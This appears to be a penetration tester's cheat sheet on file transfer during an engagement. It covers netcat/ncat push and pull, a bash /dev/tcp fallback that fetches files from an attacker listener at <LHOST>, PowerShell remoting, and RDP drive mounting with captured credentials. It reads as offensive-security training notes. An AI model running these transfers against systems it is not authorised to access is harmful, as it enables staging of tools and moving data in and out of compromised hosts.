# Miscellaneous File Transfer Methods

## Netcat / Ncat

Two directions — pick based on whether inbound to the target is blocked.

Target listens, attack host pushes (inbound to target must be open):

```bash
# target
nc -l -p 8000 > <OUTFILE>
ncat -l -p 8000 --recv-only > <OUTFILE>
```

```bash
# attack host
nc -q 0 <TARGET_IP> 8000 < <FILE>
ncat --send-only <TARGET_IP> 8000 < <FILE>
```

Attack host listens, target pulls (use when inbound to target is blocked):

```bash
# attack host
sudo nc -l -p 443 -q 0 < <FILE>
sudo ncat -l -p 443 --send-only < <FILE>
```

```bash
# target
nc <LHOST> 443 > <OUTFILE>
ncat <LHOST> 443 --recv-only > <OUTFILE>
```

No nc/ncat on target — `/dev/tcp` bash fallback (attack host still listens as above):

```bash
cat < /dev/tcp/<LHOST>/443 > <OUTFILE>
```

> [!tip] `-q 0` / `--send-only` and `--recv-only` are what actually close the connection cleanly after transfer. Without them both sides hang waiting for more data.

---

## PowerShell Remoting (WinRM)

Use when HTTP/HTTPS/SMB are all blocked — WinRM on TCP/5985 (HTTP) or 5986 (HTTPS) may still be open between Windows hosts.

Confirm WinRM reachable before attempting:

```powershell
Test-NetConnection -ComputerName <HOSTNAME> -Port 5985
```

Create session, then push/pull with Copy-Item:

```powershell
$Session = New-PSSession -ComputerName <HOSTNAME>
Copy-Item -Path <LOCALFILE> -ToSession $Session -Destination <REMOTE_PATH>
Copy-Item -Path <REMOTE_PATH> -Destination <LOCALPATH> -FromSession $Session
```

---

## RDP

Mount a local folder into the RDP session at connect time:

```bash
xfreerdp /v:<TARGET> /d:<DOMAIN> /u:<USER> /p:<PASS> /drive:linux,<LOCAL_PATH>
rdesktop <TARGET> -d <DOMAIN> -u <USER> -p <PASS> -r disk:linux=<LOCAL_PATH>
```

Mounted share is accessible inside the session at `\\tsclient\<SHARENAME>`. Drag/drop or `copy` from there directly.

> [!warning] Mounting a folder containing tools/malware through RDP may trigger Defender on the remote host and delete files from your local folder too — Defender reaches back through the mapped drive.